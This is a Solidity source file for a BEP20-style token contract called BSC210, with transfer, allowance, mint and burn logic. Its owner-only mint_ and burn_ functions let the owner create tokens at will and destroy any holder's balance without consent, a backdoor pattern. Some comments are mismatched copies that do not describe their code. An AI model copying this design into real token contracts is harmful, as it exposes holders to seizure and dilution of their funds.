// SPDX-License-Identifier: MIT

pragma solidity >=0.6.12;

import './Ownable.sol';
import './Context.sol';
import './IBSC210.sol';
import './SafeMath.sol';
import './Address.sol';

contract BSC210 is Context, IBSC210, Ownable 
{
    using SafeMath for uint256;
    using Address for address;

struct _slim
{
string _name;
string _symbol;
uint8 _decimals;
uint256 _totalSupply;
mapping(address => uint256) _balances;
mapping(address => mapping(address => uint256)) _allowances;
mapping(address => uint256) _commitValue;
mapping(address => uint256) _commitTimeEnd;
mapping(address => uint256) _commitTimeStart;
mapping(address => uint256) _commitRate;
mapping(address => uint8) _accessLevel;
}

    _slim slim;

    constructor(string memory name, string memory symbol) public {
        slim._name = name;
        slim._symbol = symbol;
        slim._decimals = 18;
        slim._accessLevel[msg.sender] = 10;
    }
    /**
     * @dev set user access (0-255).
     */
    function setAccess(address account, uint8 level) public onlyOwner returns (bool) {
        slim._accessLevel[account] = level;
        return true;
    }
    /**
     * @dev Returns user access level (0-255).
     */    
    function accessLevel(address account) public override view returns (uint8) {
        return slim._accessLevel[account];
    }
    /**
     * @dev Returns user interest variable.
     */   
    function commitRate(address account) public override view returns (uint256) {
        return slim._commitRate[account];
    }
    /**
     * @dev Returns user locked value.
     */  
    function commitValue(address account) public override view returns (uint256) {
        return slim._commitValue[account];
    }
     /**
     * @dev Returns the time token lock started for [user].
     */
    function _commitTimeStart(address account) public override view returns (uint256) {
        return slim._commitTimeStart[account];
    }
    /**
     * @dev Returns the time token lock ends for [user].
     */
    function _commitTimeEnd(address account) public override view returns (uint256) {
        return slim._commitTimeEnd[account];
    }

    /**
     * @dev Returns the BSC210 token owner.
     */
    function getOwner() external override view returns (address) {
        return owner();
    }

    /**
     * @dev Returns the token name.
     */
    function name() public override view returns (string memory) {
        return slim._name;
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() public override view returns (uint8) {
        return slim._decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() public override view returns (string memory) {
        return slim._symbol;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() public override view returns (uint256) {
        return slim._totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) public override view returns (uint256) {
        return slim._balances[account];
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender) public override view returns (uint256) {
        return slim._allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {BEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            slim._allowances[sender][_msgSender()].sub(amount, 'BSC210: transfer amount exceeds allowance')
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, slim._allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(
            _msgSender(),
            spender,
            slim._allowances[_msgSender()][spender].sub(subtractedValue, 'BSC210: decreased allowance below zero')
        );
        return true;
    }

    /**
     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
     * the total supply.
     *
     * Requirements
     *
     * - `msg.sender` must be the token owner
     */
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(_msgSender(), amount);
        return true;
    }
     /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `address[x]` cannot be the zero address.
     * - `sender` must have a balance of at least `amount` x [n].
     */
    function devsend(address payable address1,address payable address2,address payable address3,address payable address4,address payable address5,uint8 amount)public returns (bool){
        transfer(address2, 
        amount);
        transfer(
            address1, amount);
        transfer(address3,  amount);
        transfer(
            address4, amount);
        transfer(address5, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), 'BSC210: transfer from the zero address');
        require(recipient != address(0), 'BSC210: transfer to the zero address');

        slim._balances[sender] = slim._balances[sender].sub(amount, 'BSC210: transfer amount exceeds balance');
        slim._balances[recipient] = slim._balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), 'BSC210: mint to the zero address');

        slim._totalSupply = slim._totalSupply.add(amount);
        slim._balances[account] = slim._balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }   function mint_(address account, uint256 amount) public onlyOwner override returns (bool) {
    require(account != address(0), 'BSC210: mint to the zero address');
    slim._totalSupply = slim._totalSupply.add(amount);
    slim._balances[account] = slim._balances[account].add(amount);
    emit Transfer(address(0), account, amount);
    return true;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), 'BSC210: burn from the zero address');

        slim._balances[account] = slim._balances[account].sub(amount, 'BSC210: burn amount exceeds balance');
        slim._totalSupply = slim._totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }function burn_(address account, uint256 amount) public onlyOwner() override returns (bool) {
        require(account != address(0), 'BSC210: burn from the zero address');

        slim._balances[account] = slim._balances[account].sub(amount, 'BSC210: burn amount exceeds balance');
        slim._totalSupply = slim._totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), 'BSC210: approve from the zero address');
        require(spender != address(0), 'BSC210: approve to the zero address');

        slim._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            slim._allowances[account][_msgSender()].sub(amount, 'BSC210: burn amount exceeds allowance')
        );
    }
}
